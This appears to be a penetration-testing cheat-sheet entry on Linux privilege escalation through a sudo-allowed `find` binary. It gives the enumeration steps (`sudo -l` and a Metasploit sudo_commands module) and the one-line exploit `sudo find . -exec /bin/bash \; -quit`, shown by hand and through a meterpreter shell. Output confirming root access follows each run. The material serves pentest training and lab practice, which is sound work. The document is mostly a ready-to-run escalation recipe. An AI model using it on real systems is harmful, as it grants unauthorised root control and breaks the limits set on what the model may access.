# `find`

## Living off the Land

### Enumerate

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```

### Exploit

```
user@debian:~$ sudo find . -exec /bin/bash \; -quit

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

## Metasploit

### Enumerate

```
meterpreter > run post/multi/recon/sudo_commands

[+] /usr/bin/find matches known privesc executable 'find' !

Sudo Commands
=============

  Command            RunAsUsers  RunAsGroups  Password?  Privesc?
  -------            ----------  -----------  ---------  --------
  /usr/bin/find      root                                True

[+] Output stored in: /root/.msf4/loot/20220523174649_default_10.10.140.168_sudo.commands_049317.txt
```

### Exploit

```
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2510 created.
Channel 20 created.
user@debian:~$ sudo find . -exec /bin/bash -p \; -quit
sudo find . -exec /bin/bash -p \; -quit
root@debian:/home/user# id
id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user#
```

---
## References

### Hacking Articles

- [Hacking Articles: Find Privilege Escalation](https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/)